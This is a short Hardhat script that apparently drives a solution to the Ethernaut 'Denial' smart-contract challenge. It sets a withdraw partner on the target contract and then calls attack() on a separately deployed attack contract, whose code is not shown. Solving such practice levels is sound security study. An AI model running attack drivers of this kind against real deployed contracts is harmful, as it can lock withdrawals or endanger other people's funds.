const hre = require("hardhat")

async function main() {
    const instanceAddress = "0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e"
    const Instance = await hre.ethers.getContractAt("Denial", instanceAddress)
    const balance = await Instance.contractBalance()
    console.log(balance)

    const localaddr = "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"
    await Instance.setWithdrawPartner(localaddr)

    
    const contractAddress = "0x2867579f704bdc9eB4A777b55D10eb7F865DC96D"
    const Contract = await hre.ethers.getContractAt("Attack", contractAddress)
    await Contract.attack()
}

main()